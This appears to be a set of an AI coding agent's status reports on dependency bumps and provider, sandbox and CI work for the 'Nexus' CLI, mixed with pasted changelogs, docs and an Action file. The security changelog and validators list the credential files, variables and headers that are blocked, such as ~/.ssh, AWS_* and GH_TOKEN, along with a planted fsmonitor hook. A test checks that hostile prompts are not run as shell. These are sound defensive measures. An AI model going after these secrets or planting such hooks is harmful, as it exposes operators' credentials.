I verified both fixes on Node 22 and 24 (21 of 21 across the cancel, confine and ratchet tests, no leaked `bwrap`). They went in as a normal commit on #554, merged into #555 and #556 without rewriting any history.

=== commander v13.0.0
### Added

- support multiple calls to `.parse()` with default settings (#2299)
- add `.saveStateBeforeParse()` and `.restoreStateBeforeParse()` for use by subclasses (#2299)
- style routines like `styleTitle()` to add color to help using `.configureHelp()` or Help subclass (#2251)
- color related support in `.configureOutput()` for `getOutHasColors()`, `getErrHasColors()`, and `stripColor()` (#2251)
- Help property for `minWidthToWrap` (#2251)
- Help methods for `displayWidth()`, `boxWrap()`, `preformatted()` et al (#2251)

### Changed

- *Breaking*: excess command-arguments cause an error by default, see migration tips (#2223)
- *Breaking*: throw during Option construction for unsupported option flags, like multiple characters after single `-` (#2270)
- *Breaking*: throw on multiple calls to `.parse()` if `storeOptionsAsProperties: true` (#2299)
- TypeScript: include implicit `this` in parameters for action handler callback (#2197)

### Deleted

- *Breaking*: `Help.wrap()` refactored into `formatItem()` and `boxWrap()` (#2251)

### Migration Tips

**Excess command-arguments**

It is now an error for the user to specify more command-arguments than are expected. (`allowExcessArguments` is now false by default.)

Old code:

```js
program.option('-p, --port <number>', 'port number');
program.action((options) => {
  console.log(program.args);
});
```

Now shows an error:

```console
$ node example.js a b c
error: too many arguments. Expected 0 arguments but got 3.
=== commander v14.0.0
### Added

- support for groups of options and commands in the help using low-level `.helpGroup()` on `Option` and `Command`, and higher
-level `.optionsGroup()` and `.commandsGroup()` which can be used in chaining way to specify group title for following option
s/commands (#2328)
- support for unescaped negative numbers as option-arguments and command-arguments (#2339)
- TypeScript: add `parseArg` property to `Argument` class (#2359)

### Fixed

- remove bogus leading space in help when option has default value but not a description (#2348)
- `.configureOutput()` now makes copy of settings instead of modifying in-place, fixing side-effects (#2350)

### Changed

- *Breaking:* Commander 14 requires Node.js v20 or higher
- internal refactor of `Help` class adding `.formatItemList()` and `.groupItems()` methods (#2328)
=== commander v15.0.0
Commander 15 is ESM only. This is expected to be seamless for ESM consumers, but some CommonJS consumers may hit issues with tooling requiring configuration for ESM-only dependencies. See Migration Tips below.

The release of Commander 15 moves Commander 14 into maintenance. Commander 14 will get security updates for
12 months (to May 2027). For more info see [Release Policy](https://github.com/tj/commander.js/blob/v15.0.0/docs/release-policy.md).

### Added

- show excess command-arguments in error message (#2384)

### Fixed

- *Breaking:* only lone `--no-*` option sets default option value to `true`, default not implicitly set when define both positive and negative option in either order (#2405)
- update example to use compatible character for MINGW64 (#2475)

### Changed

- *Breaking:* migrated Commander implementation from CommonJS to ESM (#2464)
- *Breaking:* Commander 15 requires Node.js v22.12.0 or higher (for `require(esm)`).
- dev: switch tests from Jest to `node:test` test runner (#2463)

### Deleted

- *Breaking:* removed deprecated export of `commander/esm.mjs` (#2464)

### Migration Tips

Commander 15 is ESM only, but this does not mean you need to migrate to ESM to use it. Importing ESM from CommonJS is
supported by Node.js, and Bun, and Deno. Hopefully it Just Works for you! However, you may be using a different runtime or
some other part of your setup that may not yet natively support importing ESM from CommonJS, such as your testing framework
or bundler.

If you have problems using Commander 15 in your environment, one option is stay on Commander 14 for now. Commander 14 will
get security updates until May 2027 and things will hopefully improve for your setup in the meantime.

Wave 1 is under way: I've asked Dependabot to rebase #533 (`dotenv` patch) and #530 (`commander` 12→15) onto the current `main`.

These runs date from the red-`main` window I fixed in #525, so the failures are most likely stale-base noise. A rebased run is the quickest way to confirm that.

Commander 13 also made excess arguments an error by default, which the tests should show. If CI is green, I'll fix the engines range in our own branch, supersede #530 and note it in the changelog.
- **Next:** once wave 1 is checked, I rebase the 12 experiments bumps in small groups to keep CI load down. Many of them are the same bump across directories, so I'll check each one's real diff and merge only those that pass at their exact head.

Two watches are running, one on the two rebased PRs and one 25-minute fallback. Nothing has been merged or closed yet.

11-### Security

13-- Commands run through `run_command` no longer inherit credentials from the Nexus process. Variables from `~/.config/nexus/config.env`, plus anything named like a key, token, secret or password, `AWS_*`, `GH_TOKEN` and similar, are removed from the command environment, including inside the write-mode bwrap sandbox. To pass a variable through deliberately, list its name in `NEXUS_COMMAND_ENV_PASSTHROUGH` (operator environment or `config.env` only). Commands that relied on `SSH_AUTH_SOCK`, `GH_TOKEN` and similar must now opt in. Without `--sandbox` a command still runs as your user and can read your files and its parent processes' environment.
14-- `--sandbox` now actually confines. Write-mode sandboxed commands run with `$HOME` masked, so `~/.ssh`, `~/.aws`, `~/.gnupg` and `~/.config/nexus` are unreadable, even when the workspace is, contains, or sits above `$HOME`. Only toolchain directories (`~/.cargo`, `~/.rustup`, `~/.nvm`, `~/.local/bin`, `~/.npm`, `~/.cache/pip`, `~/go/pkg`, `PATH` entries under HOME) are mounted read-only; extend them with `NEXUS_SANDBOX_HOME_READONLY`. The network is off by default; opt in with `--sandbox-network` or `NEXUS_SANDBOX_NETWORK=1` (not implied by `--yes`). Sandboxed commands die with the runner and cannot see host processes. `nexus doctor` lists the effective mounts and overlays. Files outside `$HOME` remain readable inside the sandbox.
15-- The legacy task-worktree merge refuses a worktree whose `.git` was replaced, and runs Git with hooks and fsmonitor disabled; a planted `core.fsmonitor` or hook in an agent-writable worktree no longer runs code outside it. The repository's own hooks no longer fire on that commit and merge.
16-- The `--sandbox docker` engine runs a digest-pinned image (alpine 3.23) as the invoking uid with all capabilities dropped, `no-new-privileges`, a read-only root plus a tmpfs `/tmp`, a 512-process limit, and no network unless `--sandbox-network` / `NEXUS_SANDBOX_NETWORK=1` is set. Only the scrubbed command environment reaches the container, and credential locations under a workspace that is or contains `$HOME` are masked. `NEXUS_SANDBOX_DOCKER_IMAGE` (operator setting) may substitute another image but it must be digest-pinned, otherwise no container is started. Commands that wrote outside the workspace and `/tmp`, relied on root, or used the network now fail in Docker mode.

Supersedes the Dependabot bump #530 (commander 12 → 15). It targets commander 14 instead, so the supported Node.js floor stays 22.

## Why not 15
Commander 15 requires Node ≥22.12.0, and CI on the first version of this PR proved what that costs: `node_floor.test.ts` enforces that `package.json` engines, `doctor`, the upgrade preflight and `install.sh` state the same **major-only** floor (22), and the frozen v1.0.0 spec text asserts `">=22"`. Commander 14 supports Node ≥20 and is the maintainer-supported line until May 2027. Node 22 itself reaches end of life around April 2027, which is the natural point to raise the floor deliberately and take 15.

- `commander` 12.1.0 → 14.0.3 (`engines.node` stays `>=22` in `cli/package.json` and the lockfile root).

content.text:
CI on #557 failed on its first version, and I've changed the PR as a result.

**What CI caught:** one test out of 3,892 on Node 22, `node_floor.test.ts`. The repo enforces that `package.json` engines, `doctor`, the upgrade preflight and `install.sh` all state the same major-only Node floor of 22. My engines bump to `>=22.12.0` broke that. My local run couldn't have shown it, because the timed-out full run never reached that test.

**The change:** #557 now takes commander **14.0.3** (`engines` stays `>=22`) in place of 15.
- Commander 15 would mean reworking the installer's version parsing, two source files, several tests and frozen spec text, in release-critical code, for no functional gain.
- Commander 14 is maintainer-supported until May 2027, and its own Node requirement is `>=20`.
- Node 22 reaches end of life around April 2027, which is the natural moment to raise the floor deliberately and take 15.
- The `allowExcessArguments(true)` line and its test are unchanged. The test fails 2 of 2 without the line and passes 2 of 2 with it on commander 14.

**A correction to what I said earlier:** I claimed Node 22.0–22.11 users would hit a broken install. I hadn't verified that, and it is probably wrong for an ESM import like ours. The `22.12` figure exists for `require(esm)`, which we don't use. The floor invariant is the real reason for the switch.

**Next:**
- The watch (`ba0qb7qfl`) covers #557 at its new head `e85e8e39` and the two `cf` PRs, #535 and #536.
- I merge #557 only after its checks pass at that head. Then I close #530 with a link and `@dependabot ignore this major version`, so Dependabot doesn't reopen commander 15. That ignore is a Dependabot setting I can reverse, and I'll say so in the comment.

All 14 Dependabot PRs are actioned and none is still open. Thirteen are merged, and #530 is closed as superseded. `main` is at `e9ef4721`.

| PR | Change | Result |
|---|---|---|
| #533 | `dotenv` 18.0.9 → 18.0.10 | merged |
| #537, #528, #529, #532 | `vite` 8.3.6 → 8.3.8, in four directories | merged |
| #535, #536, #534, #538, #527 | `cf` → beta.31, in five directories | merged |
| #531, #539, #540 | `@cloudflare/vite-plugin` → beta.v.16, in three directories | merged |
| #530 → #557 | `commander` 12 → **14** | #557 merged; #530 closed |

**How they were verified:**
- **Exact head:** each merge was made at the PR's exact head, after every check passed.
- **Fresh base:** each had been tested on a current base. Several were rebased, and #527 was recreated, because their original runs were 57 or more commits stale.
- **Shared files:** PRs that shared a file with an earlier merge (#538, #534, #529) were re-tested on top of it.
- **Diffs read:** I read each diff.

**Commander:**
- **Why 14 instead of 15:** CI on the first version caught that raising `engines` to `>=22.12.0` broke the repo's Node-floor invariant, which `install.sh`, `doctor`, the upgrade preflight and a test all enforce as major-only. Commander 14 supports Node ≥20 and keeps the floor at 22.
- **Behaviour kept:** commander 13 and later reject extra command-line arguments, where `nexus doctor extra` used to run doctor. I kept the old behaviour with `allowExcessArguments(true)` and a test that fails 2 of 2 without it.
- **Ignore:** I asked Dependabot to ignore commander's 15.x major. `@dependabot unignore` reverses it, and the natural time to revisit is when Node 22 reaches end of life, around April 2027.

**Mistakes of mine:** I told you #531 was merged when it wasn't, because Dependabot force-pushed a new head and my head-match guard correctly refused the merge. I had hidden the command's output and missed that. I corrected the claims log, and I now check the PR's final state before logging or reporting a merge. I also said Node 22.0–22.11 users would get a broken install on commander 15, which I hadn't verified and which is probably wrong for an ESM import.

**`main` CI:** it was green on `3320a76a` (commander 14), `1366ed42`, `0309952d` and `efdde611`. The newest runs, on `8854e9f0` and the final `e9ef4721`, are still in progress, so I won't call `main` fully confirmed until they conclude. The watch (`br0q4do5j`) reports both. I cancelled five redundant intermediate `main` runs along the way, all logged and re-runnable.

**Cleanup left:** my two helper worktrees (`deps-commander`, `deps-baseline`) are still on disk. I'll remove them once the final run is read.

content.text:
The audit agent finished, and the result changes how I'll build PR-2. It touches about 12 source files and the credential path, so I'm cutting it into slices that each land on their own.

**Why it's bigger than the plan row suggests**
- Five provider-specific behaviours are hard-coded in `client.ts` and `credentials.ts`: the Copilot gpt-5 protocol rule, the ChatGPT and Copilot header hooks, the model-list query strings, the OAuth kinds, and the external-client id aliases. Each has to become data.
- `AuthStyle` only knows `bearer` and `x-api-key`. The Azure-style `api-key` header in the acceptance test needs a header-name auth kind.
- `PROVIDERS` is a frozen constant read at import time, and two files iterate it directly. A user file therefore needs a merged `allProviders()` accessor.
- A user-defined id feeds `NEXUS_<ID>_BASE_URL`, so ids need a restricted grammar before they reach environment-variable names.

**Slices (each its own PR, existing providers unchanged)**
1. **Behaviour into data:** add fields to `ProviderDefinition` for the five hard-coded rules and the `header` auth kind. The six built-ins become table entries and their request shapes are unchanged. The existing `request_shape` and `cloud_providers` tests are the proof.
2. **Registry accessor:** `allProviders()` and `providerDefinition()` read a merged table, and the two iterating files and the unknown-provider message switch to it.
3. **Operator-only `~/.config/nexus/providers.json`:** loaded like the existing `config.json` policy, so a project-level file is never read. It adds schema validation errors that name the field, and the Azure mock-server acceptance test.

**What PR-9 still needs**
- The restricted id grammar, https-only URLs, and the header-override and redaction rules are PR-9. Slice 3 would not ship before PR-9 does, because a configurable base URL with credentials is the SSRF surface it exists to close.

content.text:
PR-9 is open as #565 at head `f1829ca4`, and its required checks are running; I'll merge at that exact head only if all three succeed.

It adds a new validation module, `provider_safety`, for operator-declared providers. It checks:
- **Ids:** a strict grammar.
- **Base URLs:** https required unless the destination is local, with no embedded credentials or fragment.
- **Template variables:** values that can't change the host, path or query.
- **Headers:** routing, framing and credential headers refused, and line breaks rejected.
- **Redaction:** names of operator-declared headers go on the redaction list.

It also refuses a built-in provider base URL that contains credentials.

**Local checks:** the safety, config, provider and request_shape suites pass 126/126. My first run showed one failure because the fresh worktree lacked the Rust core binary; it passed once I copied the binary in.

**Not done yet:** the validators aren't wired into any loader, since the operator-only `providers.json` loader (PR-2 slice 3) is what will consume them. The per-key origin binding already exists in `credentialFor`, so I added no new test for "a key for provider A is never sent to provider B".

Main CI on `bf9fcf0f`, the slice 2 merge, was still in progress at the last read, so main isn't confirmed.

content.text:
PR-2 slice 3 is written but not committed or pushed. The new tests pass 11/11, and the regression run over 35 provider and config suites is still going in the background.

**What it adds**
- `provider_file.ts` reads `~/.config/nexus/providers.json` from the operator's home only, so a project file is never read. Each provider declares:
  - id, label and protocol
  - a base URL template with `{variables}`
  - fixed query parameters and extra headers
  - an auth style: `bearer`, `x-api-key`, `none`, or a custom header
- Every error names the field, for example `providers.azure-openai.authHeader`. It checks the id, URL, variables and headers with the PR-9 validators. An invalid file is reported through the same path as an invalid `config.json`, and none of its providers are registered.
- Providers from the file join the registry. A built-in id cannot be redefined, and `NEXUS_<ID>_BASE_URL` now maps `-` to `_` so hyphenated ids give a valid variable name.
- `client.ts` now appends a provider's fixed query parameters to every request URL: chat, responses, models and embeddings.
- The Azure OpenAI acceptance test runs against a mock server. It checks that the request goes to `/openai/deployments/gpt-4o/chat/completions?api-version=2024-10-21`, carries the `api-key` header, and sends no `Authorization` header.

I found and fixed one bug along the way: my loader first reused the extra-headers check on `authHeader`, which rejected `api-key`. It now has its own auth-header-name validator.

When the regression totals come back clean I'll commit, open the PR and merge at the exact verified head once the three required checks pass. Main CI on `50af60d1`, the PR-9 merge, is still unchecked.

input.new_string:
## Your own providers (`~/.config/nexus/providers.json`)

Any service that speaks one of the three wire protocols can be declared without code. The file is read only from the
operator's home directory; a `providers.json` in a project is never consulted. An invalid file is reported by
`nexus doctor` (`config.valid`) and no provider is registered from it. Built-in ids cannot be redefined. Every error
names the field (for example `providers.azure-openai.authHeader`).

```json
{
  "providers": {
    "azure-openai": {
      "label": "Azure OpenAI",
      "protocol": "openai-chat",
      "baseUrl": "https://{resource}.openai.azure.com/openai/deployments/{deployment}",
      "variables": { "resource": "acme", "deployment": "gpt-4o" },
      "query": { "api-version": "2024-10-21" },
      "auth": "header",
      "authHeader": "api-key",
      "credentialEnv": "AZURE_OPENAI_API_KEY"
    }
  }
}
```

| Field | Meaning |
|---|---|
| id (the key) | 1-32 characters of `a-z`, `0-9`, `-`, starting with a letter. Its base-URL override setting is `NEXUS_<ID>_BASE_URL` with `-` as `_`. |
| `label` | Short display name. |
| `protocol` | `openai-chat` (default), `openai-responses` or `anthropic-messages`. |
| `baseUrl` | Absolute URL; `{name}` placeholders are filled from `variables` (letters, digits, `.`, `_`, `-` only, so a value cannot change the host or path structure). `https` is required unless the destination is local (loopback, private network, or listed in `NEXUS_LOCAL_ORIGINS`). No credentials, fragment or other scheme. |
| `query` | Fixed query parameters added to every request URL. |
| `headers` | Extra static headers. `Host`, framing headers, cookies, forwarding headers and credential headers are refused; values may not contain line breaks. |
| `auth` | `bearer` (default), `x-api-key`, `header` (with `authHeader`, the header that carries the key) or `none`. |
| `credentialEnv` | Environment variable holding the key; required unless `auth` is `none`. The key is sent only to this provider's own origin. |
| `streamOnly`, `omitParams`, `usage` | Backend quirks: streamed requests only, parameters it rejects, how usage is reported. |

A declared provider is a cloud destination for disclosure purposes, like every named provider. `nexus providers` lists it
with a `providers.json` marker; `nexus doctor` (`config.providers_file`) warns when a declared provider has no credential.

## Choosing a model and connecting providers in the live view

## models.dev snapshot

`cli/src/providers.generated.json` is a dated, schema-validated snapshot of [models.dev](https://github.com/sst/models.dev)
(MIT), with the source commit sha in its header: per provider the id, display name, credential variable names, base URL
template (`${VAR}` kept verbatim), and wire-protocol class (`openai-chat`, `openai-responses`, `anthropic-messages`, or
`native:<npm package>`); per model the context, output and input limits, tool-call support, accepted `tool_choice`
modes, reasoning effort levels, and input/output price per million tokens. Only chat models that support tool calls
are kept; deprecated, alpha and websocket-only entries are dropped. `cli/src/core/models_snapshot.ts` reads it lazily
on first lookup (`snapshotDate`, `snapshotProvider`, `snapshotModel`, `resolveContext`, `acceptsToolChoice`, which
answers `"unknown"` when the snapshot has no data). `npm run build` copies the JSON into `dist`, so the release
tarball carries it.

Validation, in the generator (a violation aborts) and again in the loader (the entry is dropped):
- credential variable names must match `^[A-Z0-9][A-Z0-9_]{1,63}$`; `AWS_*`, `GOOGLE_APPLICATION_CREDENTIALS`, `*_SSH*`
  and `GITHUB_TOKEN` are refused except for amazon-bedrock, google-vertex(-anthropic) and github-copilot;
- a base URL is https (http only for localhost, 127.0.0.1, ::1), has no user or password, and its `${VAR}` names must be
  among that provider's own env names;
- well-known providers are host-pinned in `cli/src/providers.pins.json` (host suffixes, source link, and a curated
  default base URL for groq, mistral, xai, cerebras, deepinfra and togetherai); a refresh that moves a pinned provider
  off its suffix fails.

Base URL semantics: `hostFromEnv: true` means the host (or the whole URL) comes from an env variable (neon, databricks,
snowflake-cortex), so PR-2 and PR-5 must validate it after substitution. An absent `baseUrl` means unresolvable from
the snapshot: a native protocol, or `needsBaseUrl: true` (perplexity), which the operator must supply.

I'll commit, open the PR and merge at the exact verified head once the regression totals are clean and the required checks pass. Main CI on `0424984c` (the PR-3 merge) is still unchecked.

content.text:
PR-5 is written but not committed. The new tests pass, and the wider provider regression run is going in the background.

**What it adds**
- A shipped `providers.catalog.json`, in the same schema as the operator's `providers.json`, declares 12 OpenAI-compatible providers as data: Mistral, Groq, Together AI, DeepSeek, xAI, Fireworks AI, Cerebras, Perplexity, Gemini, Cloudflare Workers AI, Azure OpenAI and Bedrock.
- The registry resolves built-ins first, then the catalog, then the operator's file. An operator definition of the same id replaces the catalog entry, and built-ins are never replaced.
- Cloudflare, Azure and Bedrock depend on an account, resource or region, so they ship without a base URL. The operator sets `NEXUS_<ID>_BASE_URL` or passes `--base-url`. To allow this, `baseUrl` is now optional in the provider-file schema.
- The wire matrix now covers every key-authenticated definition. It runs text and tool-call scenarios everywhere, plus reasoning, truncation (`output_truncated`) and a 429 error for each OpenAI-chat definition. It passes 90/90.
- A catalog test checks that base URLs and key variables agree with the models.dev snapshot where it has them, and that pinned providers stay on their hosts. That test passes 5/5.

None of the 12 was exercised against its live service, since live inference is the gateway only; the docs and the changelog say so.

I'll commit and open the PR once the regression totals come back clean. Main CI on `50b53b8f` and `0bd34504` is still unchecked.

content.text:
PR #572 failed two required checks, so I haven't merged it, and I'm fixing the cause.

**What failed.** CI ran 4,026 tests: 4,018 passed and two failed, `cli_option_scope` ("a subcommand receives its own --provider and -m") and `provider_cli` ("providers list preserves safe unknown-provider diagnostics"). Both expected an "Unknown provider …" message but got the generic "provider configuration is invalid".

**Cause.** `safeConfigurationError` in `provider_cli.ts` only accepted a known-providers list made of letters, digits, commas and spaces. The catalog ids contain hyphens (`fireworks-ai`, `azure-openai`, `cloudflare-workers-ai`), so the list no longer matched and the function fell back to the generic message. The latent bug was already there; an operator `providers.json` id with a hyphen would have triggered it.

**What I got wrong.** My local run showed 3 failures out of 75 tests, and I attributed all of them to the missing core binary and the known `tui.launch` gap. I never checked the third failure's name, and the local run didn't include these two files.

**Fix.** The regex now accepts hyphens. I've started a rerun of the complete provider set in the background, including the two failing files, the wire matrix and the catalog tests. If it's clean I'll push to #572 and re-verify its checks at the new head before merging.

cd /home/mike/nexus-wt/next && cat > docs/STREAM_JSON.md <<'EOF'
# `nexus run --output stream-json`

One JSON object per line (NDJSON) on **stdout**, and nothing else there: human text, diagnostics and the cloud-usage
summary go to stderr or are left out. Use it to follow a run live from a script or another tool.

```bash
nexus run -y --output stream-json "fix the failing test" | jq -c 'select(.type=="tool.end")'
```

`--output` takes `text` (default), `json` (identical to `--json`: one document at the end) or `stream-json`.
`--json` cannot be combined with `--output stream-json`; an unknown format exits 2 with a usage error.

## Envelope

Every event has:

| Field | Meaning |
|---|---|
| `schemaVersion` | `1`. Changes only when an existing field changes meaning or goes away; new event types and new fields do not bump it, so readers must ignore what they do not know. |
| `seq` | 1, 2, 3, … within the run, no gaps. |
| `ts` | ISO 8601 UTC time the event was written. |
| `type` | One of the types below. |

Newlines (and U+2028/U+2029) inside strings are escaped, so one event is always exactly one line.

## Events

| `type` | Fields | When |
|---|---|---|
| `start` | `model`, `provider` (when a cloud provider is selected) | Once, before the first model request. |
| `assistant.delta` | `text` | A piece of the model's reply as it streams. Raw model text, as in the interactive views. |
| `tool.start` | `call_id`, `tool` | A tool call begins. Arguments are not streamed. |
| `tool.end` | `call_id`, `tool`, `success`, `output_chars`, `error`?, `denied`? | The call ends. `error` is redacted and at most 500 characters; `denied` is `true` when the operator's policy refused the call. The output itself is in the evidence of the final result. |
| `notice` | `text` | Something the operator should know (redacted, at most 500 characters). |
| `result` | The same document `--json` prints (`taskId`, `success`, `status`, `output`, `plan`, `validationReceipts`, `tokenStats`, `exitCode`, …), plus `cloudUsage` when a cloud provider was used | Once, last, when the task finished. |
| `error` | `taskId`, `message` (redacted) | Once, last, instead of `result`, when the run failed before producing one. |

The process exit code is the same as for `--json`; `result.exitCode` repeats it. A run that is killed mid-way ends
without a `result` or `error` line: treat a missing final event as a failure.

## What is not streamed

Tool arguments and outputs, file contents, and the prompt are not in the stream, so a consumer that stores it does not
store them. Assistant text is passed through as the model wrote it. Fields that carry free text from tools or
diagnostics are redacted with the same rules as the rest of Nexus's output.
EOF

RD-3 is built and not yet committed. The new stream tests pass 4/4 and the neighbouring suites pass 37/37. I've started a wider run over every test that touches docs or the changelog, since my docs change could trip one of those.

`nexus run --output stream-json` now writes one JSON event per line to stdout and nothing else. The events are start, assistant text, tool start, tool end, notices and a final result, or an error event if the run fails first. `--output json` is the same as `--json`. An unknown format, or `--json` combined with stream-json, exits 2 with a usage error. The schema is documented in the new `docs/STREAM_JSON.md`.

A real-run test drives the actual CLI against a scripted gateway with a tool call, and checks every stdout line parses and `seq` runs 1..n. Tool arguments and outputs are deliberately not streamed, and tool errors and notices are redacted and capped at 500 characters. Assistant text goes through raw, as it does in the interactive views, and the doc says so.

I found and fixed two mistakes of my own while building:
- **Swallowed events:** my event writer looked up `process.stdout.write` at call time, but `runTask` swaps that function out during a run, so every event would have been captured into logs instead of printed. It now binds the real write function up front.
- **Misleading `start` event:** I had placed it before model auto-detection, so it could have reported the placeholder `local-model`. It now fires just before `runTask`.

I'll commit, open the PR and merge at the exact verified head once the docs run is clean and the three required checks pass. Main CI on `f3cae69b` (the PR-5 merge) is still unchecked.

#!/usr/bin/env bash
# A task that finishes only when a trusted verifier passes. The verifier command is the operator's, not the model's:
# `--authoritative-verifier` must succeed before Nexus will report the task complete, and the exit code says so.
#   0  the task completed and the verifier passed
#   !0 anything else (verifier failing, task blocked, budget reached, cancelled)

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT
cp -R "$here/project/." "$work/"

git -C "$work" -c user.name=example -c user.email=example@example.invalid commit -q -m "start"

${NEXUS:-nexus} run -y -w "$work" --authoritative-verifier "node --test" ${NEXUS_ARGS:-} \
  "Fix add() in add.js so that the test in test/add.test.js passes."
status=$?

EOF

# Verified completion

`run.sh` copies a tiny project whose `add()` is wrong into a scratch repository and asks Nexus to fix it, with
`node --test` as the **authoritative verifier**. Nexus may not report the task complete until that command passes on
the final workspace, so the process exit code is a gate you can rely on in scripts and CI:

```bash
NEXUS=nexus examples/verified-completion/run.sh      # your endpoint and model as for any `nexus run`

See `docs/USER_MANUAL.md` for the verification model, and `docs/STREAM_JSON.md` to follow the run as events.

cd /home/mike/nexus-wt/rd4 && cat > action/action.yml <<'EOF'
name: Nexus Code run
description: Run a Nexus Code task in CI. The step fails unless the task completed and verified.
author: mikeholownych

inputs:
  prompt:
    description: The task for Nexus to carry out.
    required: true
  version:
    description: Nexus release to install (a tag such as v1.2.1). Pin one for reproducible runs; "latest" is the newest stable release.
    default: latest
  workspace:
    description: Directory to work in, relative to the repository root.
    default: "."
  authoritative-verifier:
    description: Trusted command that must pass before the task can complete (for example "npm test"). Strongly recommended.
    default: ""
  provider:
    description: Cloud inference provider id (see `nexus providers`). Empty uses the endpoint in the environment.
    default: ""
  model:
    description: Model id for the selected provider or endpoint.
    default: ""
  extra-args:
    description: Further `nexus run` options, split on spaces (workflow-author supplied, never from untrusted input).
    default: ""

outputs:
  success:
    description: '"true" when the task completed and verified.'
    value: ${{ steps.run.outputs.success }}
  status:
    description: Task lifecycle status reported by Nexus.
    value: ${{ steps.run.outputs.status }}
  task-id:
    description: The Nexus task id.
    value: ${{ steps.run.outputs.task-id }}
  exit-code:
    description: The exit code of `nexus run`.
    value: ${{ steps.run.outputs.exit-code }}
  result-file:
    description: Path to the JSON result document.
    value: ${{ steps.run.outputs.result-file }}

# Credentials are passed by the calling step's `env:` (for example OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}),
# never as inputs. Scripts below contain no `${{ }}` expressions: every input reaches them as an environment variable, so
# a prompt or option value cannot be interpreted as shell.
runs:
  using: composite
  steps:
    - name: Install Nexus
      shell: bash
      env:
        NEXUS_VERSION: ${{ inputs.version }}
        NEXUS_PREFIX: ${{ runner.temp }}/nexus
        NEXUS_ACTION_TEMP: ${{ runner.temp }}
      run: |
        set -euo pipefail
        sh "$GITHUB_ACTION_PATH/../install.sh"
        echo "$NEXUS_PREFIX/bin" >> "$GITHUB_PATH"

    - name: Run Nexus
      id: run
      shell: bash
      env:
        NEXUS_ACTION_PROMPT: ${{ inputs.prompt }}
        NEXUS_ACTION_WORKSPACE: ${{ inputs.workspace }}
        NEXUS_ACTION_VERIFIER: ${{ inputs.authoritative-verifier }}
        NEXUS_ACTION_PROVIDER: ${{ inputs.provider }}
        NEXUS_ACTION_MODEL: ${{ inputs.model }}
        NEXUS_ACTION_EXTRA_ARGS: ${{ inputs.extra-args }}
        NEXUS_ACTION_TEMP: ${{ runner.temp }}
      run: |
        set -uo pipefail
        result="${NEXUS_ACTION_TEMP:-${RUNNER_TEMP:-/tmp}}/nexus-result.json"
        args=(run -y -w "${NEXUS_ACTION_WORKSPACE:-.}" --json)
        [ -n "${NEXUS_ACTION_VERIFIER:-}" ] && args+=(--authoritative-verifier "$NEXUS_ACTION_VERIFIER")
        [ -n "${NEXUS_ACTION_PROVIDER:-}" ] && args+=(--provider "$NEXUS_ACTION_PROVIDER")
        [ -n "${NEXUS_ACTION_MODEL:-}" ] && args+=(-m "$NEXUS_ACTION_MODEL")
        if [ -n "${NEXUS_ACTION_EXTRA_ARGS:-}" ]; then
          read -r -a extra <<< "$NEXUS_ACTION_EXTRA_ARGS"
          args+=("${extra[@]}")
        fi
        "${NEXUS:-nexus}" "${args[@]}" -- "$NEXUS_ACTION_PROMPT" > "$result"
        code=$?
        field() { node -e 'let d="";process.stdin.on("data",c=>d+=c).on("end",()=>{try{const v=JSON.parse(d)[process.argv[1]];process.stdout.write(v===undefined?"":String(v))}catch{}})' "$1" < "$result"; }
        {
          echo "success=$(field success)"
          echo "status=$(field status)"
          echo "task-id=$(field taskId)"
          echo "exit-code=$code"
          echo "result-file=$result"
        } >> "${GITHUB_OUTPUT:-/dev/null}"
        {
          echo "### Nexus: $(field status) (exit $code)"
          echo
          echo "success: $(field success), task: $(field taskId)"
        } >> "${GITHUB_STEP_SUMMARY:-/dev/null}"
        # The exit code is the gate: Nexus exits non-zero unless the task completed and verified.
        exit "$code"
EOF

name: nexus

content.text:
RD-4 and DH-3 are drafted: the Action, the four examples and a test that runs them. Two of the pieces I wrote don't work yet, and I'm waiting on a full test run to see exactly why.

**Written so far**
- `action/action.yml`, a composite Action that installs a pinned release with the checksum-verifying `install.sh` and runs `nexus run --json` with the inputs passed as environment variables. The run script contains no `${{ }}` expressions, so a prompt can't be interpreted as shell. It sets `success`, `status`, `task-id` and `exit-code` outputs and exits with Nexus's own exit code.
- `examples/`: verified completion, worktree, an operation spec with `git.isolate`, and a CI workflow. I replaced a model id I'd written from memory with one confirmed in the bundled data.
- `cli/test/examples.test.ts` runs each example's real script through a shim of the CLI against a scripted gateway.

**Status of the test:** 3 of 6 pass, covering the operation spec, the Action file's structure and the hostile-input check's setup. The verified-completion, worktree and Action-run tests fail because `task_completed` errors even in the scenario where the fix is made and the verifier passes. I haven't found out why yet. My first debug attempt was invalid, because I used a blocking `spawnSync` that froze the in-process gateway.

I won't loosen assertions to get green. If the completion gate needs an extra flag, such as `--deliverable-file`, the example must show it, because the examples are meant to be accurate.

Main CI on `aea2838a` (the RD-3 merge) and #574 (the DH-4 docs PR) are still pending.

PR #574 (DH-4) is merged at `65c76b28`, with its three required checks green at the head I merged. Main CI is confirmed green on `aea2838a`, the RD-3 merge.

RD-4 and DH-3 are written and not yet committed. The Action and the four examples are built, and `examples.test.ts` passes 6/6 in about 50 seconds. A wider regression run, including the leak ratchet and the docs and changelog scanners, is still going in the background. I'll commit and open the PR only if that run is clean.

What the test proves about each piece:
- **Verified completion:** a real fix exits 0, and a completion claim the verifier rejects exits non-zero. That is the gate the Action relies on.
- **Worktree:** the task runs on its own branch and the starting branch is left alone.
- **Action:** the actual run script, executed the way GitHub would run it, sets its outputs and exits with Nexus's exit code, and a hostile prompt or model value is not interpreted as shell.
- **Operation spec:** it validates, and removing `git.isolate` makes the spec refused.

Running the examples for real exposed three faults of mine, all fixed:
- **Missing `--deliverable-file add.js`:** without it, editing the file the verifier reads voids the verification. The Action gets a `deliverable-files` input too.
- **`set -e` in the example script:** a failing run skipped the printed exit status.
- **`NODE_TEST_CONTEXT`:** the test harness's own variable made the nested `node --test` run zero tests, so it is stripped in the test.

Also, the Action runs `nexus run --json`, not `--output stream-json`, so it works on every release, including the current `latest` (v1.2.0).

The example workflow pins `mikeholownych/nexus-code/action@v1.2.1`, a tag that doesn't exist until I cut the release, which this goal covers.

content.text:
PC-3 is open as PR #576 at head `1f2983eb`. Its three required checks are running, and I'll merge at that exact head only if all three succeed.

